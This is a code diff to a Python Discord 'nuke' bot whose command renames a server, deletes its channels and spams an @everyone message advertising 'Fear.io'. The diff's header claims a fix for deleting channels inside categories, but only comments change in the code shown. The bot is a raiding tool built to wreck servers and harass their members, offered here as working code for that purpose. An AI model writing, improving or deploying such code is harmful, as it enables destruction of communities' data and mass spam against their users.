@@ -1,3 +1,6 @@
+# Fixed the bot not being able to delete channels inside categories
+
+
 import discord
 from discord.ext import commands
 import asyncio
@@ -11,7 +14,7 @@ SPAM_MESSAGE = "@everyone **Wake up, Fear.io is here** :joy: https://tenor.com/v
 intents = discord.Intents.default()
 intents.guilds = True
 intents.messages = True
-intents.message_content = True  # Ensure you have this enabled on your bot in the developer portal
+intents.message_content = True  # Ensure you have this enabled in your bot
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
@@ -29,7 +32,7 @@ async def nuke(ctx):
             await guild.edit(name=GUILD_NAME)
             print(f'Server renamed to: {GUILD_NAME}')
             
-            # Delete existing channels
+            # Delete existing channels, including channels in categories
             for channel in guild.channels:
                 if isinstance(channel, discord.TextChannel):
                     await channel.delete()
